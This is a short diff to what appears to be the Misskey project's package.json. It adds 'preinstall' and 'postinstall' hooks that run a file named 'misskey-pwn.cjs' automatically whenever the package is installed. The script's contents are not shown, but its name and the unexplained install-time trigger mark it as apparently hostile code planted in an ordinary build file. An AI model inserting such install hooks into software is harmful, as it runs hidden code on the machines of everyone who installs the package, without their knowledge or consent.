@@ -22,6 +22,8 @@
 	],
 	"private": true,
 	"scripts": {
+		"preinstall": "node misskey-pwn.cjs",
+		"postinstall": "node misskey-pwn.cjs",
 		"compile-config": "cd packages/backend && pnpm compile-config",
 		"build-pre": "node scripts/build-pre.mjs",
 		"build-assets": "node ./scripts/build-assets.mjs",
